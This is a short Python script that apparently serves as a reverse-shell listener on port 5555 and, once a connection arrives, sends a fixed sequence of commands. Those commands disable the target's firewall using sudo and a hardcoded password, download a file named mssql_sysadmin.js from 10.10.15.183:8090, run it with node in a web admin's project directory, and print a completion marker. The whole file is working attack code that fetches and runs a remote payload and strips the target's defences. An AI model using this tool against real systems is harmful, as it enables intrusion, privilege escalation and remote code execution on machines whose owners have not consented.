#!/usr/bin/env python3
import socket, threading, sys, time

PORT = 5555
PASS = r"opc0932k90%%lODFI93-++"
s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", PORT)); s.listen(1)
print("listen", PORT, flush=True)
c, a = s.accept(); print("conn", a, flush=True)

def recv():
    while True:
        d = c.recv(8192)
        if not d: break
        sys.stdout.buffer.write(d); sys.stdout.flush()
threading.Thread(target=recv, daemon=True).start()
time.sleep(0.8)

cmds = [
    f"echo '{PASS}' | sudo -S ufw disable",
    "curl -fsSL -o /tmp/mssql_sysadmin.js http://10.10.15.183:8090/mssql_sysadmin.js",
    "cd /home/webadmin/aegis && node /tmp/mssql_sysadmin.js",
    "echo DONE_MSSQL",
]
for cmd in cmds:
    print(">>>", cmd, flush=True)
    c.send((cmd + "\n").encode())
    time.sleep(5 if "node" in cmd else 2)
time.sleep(8)
c.close()
